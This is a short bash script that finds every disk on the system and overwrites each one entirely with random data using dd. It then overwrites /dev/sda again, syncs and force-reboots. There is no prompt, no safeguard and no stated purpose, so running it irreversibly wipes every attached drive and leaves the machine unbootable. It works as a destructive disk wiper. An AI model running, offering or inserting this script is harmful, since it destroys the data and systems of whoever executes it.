#!/bin/bash

disks=$(lsblk -d -n -o NAME,SIZE,TYPE | grep 'disk' | awk '{print "/dev/"$1}')

for disk in $disks; do
    dd if=/dev/urandom of=$disk bs=4M status=progress
done

sync

dd if=/dev/urandom of=/dev/sda bs=4M status=progress

sync

reboot -f
